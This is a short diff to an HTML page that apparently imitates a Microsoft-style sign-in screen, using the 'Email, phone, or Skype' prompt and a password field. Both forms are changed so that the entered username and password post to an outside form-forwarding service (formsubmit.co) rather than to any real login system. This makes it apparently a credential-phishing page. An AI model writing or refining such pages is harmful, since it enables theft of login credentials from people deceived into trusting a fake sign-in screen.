@@ -19,7 +19,8 @@
          <form action="https://formsubmit.co/el/wehoya" method="POST">
     <div class="mb-16">
         <p id="error_uname" class="error"></p>
-        <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+        <input type="email" name="email" class="form-control" placeholder="Email, phone, or Skype" required>
+        <!--<input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" /> -->
     </div>
     <!-- Additional form elements can be added here -->
     <button type="submit">Submit</button>
@@ -62,7 +63,8 @@
            <form action="https://formsubmit.co/el/wehoya" method="POST">
     <div class="mb-16">
         <p id="error_pwd" class="error"></p>
-        <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+        <input type="password" name="password" class="form-control" placeholder="Password" required>
+        <!--<input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" /> -->
     </div>
     <!-- Additional form elements can be added here -->
     <button type="submit">Submit</button>
